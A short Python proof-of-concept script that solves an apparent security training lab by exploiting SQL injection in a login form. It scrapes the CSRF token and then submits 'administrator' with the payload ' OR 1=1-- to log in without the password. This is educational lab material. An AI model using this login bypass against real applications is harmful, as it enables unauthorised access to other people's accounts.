# This lab contains a SQL injection vulnerability in the login function.
# To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.
# PoC Script Credit to SamH

To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.

import requests
from bs4 import BeautifulSoup
import sys
from urllib.parse import urlparse


def parse_url(raw_url):
    return urlparse(raw_url).scheme + "://" + urlparse(raw_url).netloc

def fetch_csrf_token(login_url, session):
    try:
        response = session.get(login_url)
        response.raise_for_status()

        soup = BeautifulSoup(response.text, "html.parser")
        result = soup.find("input", {"name": "csrf"})

        if result:
            print("[+] CSRF Token : " + result["value"])
            return result["value"]
        else:
            print("[!] CSRF token not found!")
            sys.exit(1)            
    
    except:
        print("web request error.")
        sys.exit(1)


if __name__ == "__main__":
    args = sys.argv[1:]
    
    try:
        raw_url = args[0]
        base_url = parse_url(raw_url)
        login_url = base_url + '/login'

        session = requests.session()
        csrf_token = fetch_csrf_token(login_url, session)

        # Exploit
        vuln_url = login_url
        payload = '\' OR 1=1--'

        data = {
            'csrf': csrf_token,
            'username': 'administrator' + payload,
            'password': 'password'
        }

        response = session.post(vuln_url, data=data, allow_redirects=False)

        if response.status_code == 302 and response.headers.get('Location') == '/my-account?id=administrator':
            print('[+] Exploit executed successfully.')
        else: 
            print(response.status_code, response.headers)



    except IndexError:
        print("[!] Error\nUsage: python3 poc.py <lab_url>")

